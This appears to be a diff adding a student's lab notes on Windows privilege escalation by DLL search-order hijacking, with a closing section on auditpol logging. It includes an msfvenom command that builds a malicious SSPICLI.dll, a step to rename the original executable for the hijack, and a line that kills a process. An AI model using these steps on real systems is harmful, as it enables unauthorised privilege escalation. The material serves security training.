@@ -1,0 +1,50 @@
+DLL Search Order
+Executables check the following locations (in successive order):
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+
+The directory the the Application was run from<--------------------------------------------WE TARGET THIS ONE 
+
+The directory specified in in the C+ function GetSystemDirectory()
+
+The directory specified in the C+ function GetWindowsDirectory()
+
+The current directory
+----------------------------------------------------------------------------------------------------------------break 
+
+look for a scheduled task or service that we can write to the directory // or applications running from a diffrent than normal directory // public flder // downloads // users dirrectory 
+
+looking for known voulnerabilities 
+
+
+command to get sysinternals 
+net use z: "\\http://live.sysinternals.com" /persistent:yes
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+when checking for user services look for user descreption tab gveaways 
+
+=============================================================================
+
+check to see if you can write to the cirectory, right click new 
+
+(get-process | ?{$_.name -like "putty"}).kill()
+
+ msfvenom -p windows/exec CMD=' cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt -f dll > SSPICLI.dll
+
+------------------------------------------------------------------------------------------------------------------------
+
+if you cant rename the file then you have to do the above method 
+
+if you right click the file and you can ename it you cn hijack the exe
+
+rename the original to backup so you dont overwrite it 
+
+use the gui to find the tasks 
+
+=================================================================================================================================
+DEMO: Audit Logging
+Show all audit category settings
+auditpol /get /category:*
+What does the below command show?
+auditpol /get /category:* | findstr /i "success failure"
+
